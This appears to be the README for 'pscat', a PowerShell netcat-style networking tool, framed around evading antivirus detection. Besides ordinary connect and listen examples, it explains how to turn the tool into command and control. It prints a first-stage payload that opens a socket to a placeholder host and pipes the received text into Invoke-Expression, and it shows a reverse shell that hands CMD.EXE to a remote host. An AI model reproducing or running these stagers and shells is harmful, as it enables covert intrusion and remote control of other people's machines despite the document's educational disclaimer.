# pscat

pscat is a PowerShell network concatenation tool that allows for diverse use wherever PowerShell is offered.

Like most other network concatenation/administration tools, they all have one common denominator: Antivirus Detection. 
Although intentions may be benign, security vendors persist in flagging tools that have ... specific capabilities.
We can take advantage of native tools, that are trusted by said security vendors.

pscat is designed for either NT or unix platforms; Where PowerShell is, pscat may follow.

**Disclaimer**: The purpose of this tool is for educational purposes and testing only.
Do not use this tool on machines you do not have permission to use.
Do not use this tool to leverage and communicate with machines that you do not have authorization to use.

![pscat](assets/pscat.jpg)

## Installation

```PowerShell
git clone https://github.com/SilentisVox/pscat
cd pscat
. ./pscat.ps1
Get-Help pscat
```

## Usage

As far as being a copy-cat of NETCAT, PSCAT does not come close.
The features included in PSCAT are all features I felt are useful in my everyday work, not to be a replicant of NETCAT.
They are simplistic and easy to use, but there are some minor caveats that will be discussed with each feature.

#### Setting Up a Client

When describing a **client**, I am referring to the .NET **[System.Network.Sockets.TcpClient]** object.
There are 3 options when it comes to setting up a client.
First, we can connect directly to the client with the `-Connect || -c` switch.
Second, we can listen for an incoming connection from a client with the `-Listen || -l` switch.
Last, we can use an already instantiated TcpClient object with the `-UtilizeGuestClient || -u` switch.

 - Connecting directly to a client requires an **Address** and **Port** to connect. Those options are `-Address && -Port`.
 - Listening for a client requires a bind **Address** and **Port**. Those options are `-Address && -Port`.
 - Utilizing an established connection requires a TcpClient object, and utilization with the `-GuestClient` option.

```PowerShell
# Connect to a remote server on port 4444 with verbosity.
# Connect is the default operation, so it does not require the "-c" switch.
PS C:\> pc 192.168.0.101 4444 -v
VERBOSE: connection to [192.168.0.101] 4444 succeeded

# Listen for an incoming connection on a single interface and port.
PS C:\> pc -l 192.168.0.1 5555

# Utilize a TcpClient object saved to a variable.
PS C:\> pc -u -g $TcpClient
```

An important question regarding the utilization of an existing client object may be: Does this enable Command & Control?
This is where things get finnicky. 
If the correct appilcation and execution for the tool is applied, it can be.
This does not mean it's enabled defaultly.
Only meaningful, active, intentional actions would enable C2.

###### What do these actions look like?

You would have to create a handmade payload that includes the following.
The entire PSCAT tool.
A command to utilize an existing TcpClient, as well as executing a CLI process.
This payload would only come after an intial stage payload is deployed, and prepares the execution of the second stage.

The first stage in the payload might look like the following.

```PowerShell
# You may reduce this to one line.
PS C:\> $t=[Net.Sockets.TcpClient]::new("X.X.X.X",XXXX)
PS C:\> [Io.StreamReader]::new($t.GetStream()).ReadLine()|iex
```

#### Creating a Child Process

When a connection has been made/utilized, we have the option to create a child process responsible for handling what comes across the stream.
This means that anything read from the connection stream will be piped into the child process' standard input.
This also means that anything that comes from the process' standard output/error will go straight to the client.

```PowerShell
# Connect to a remote server and begin executing CMD.EXE
PS C:\> pc 192.168.0.101 6666 -e CMD.EXE
```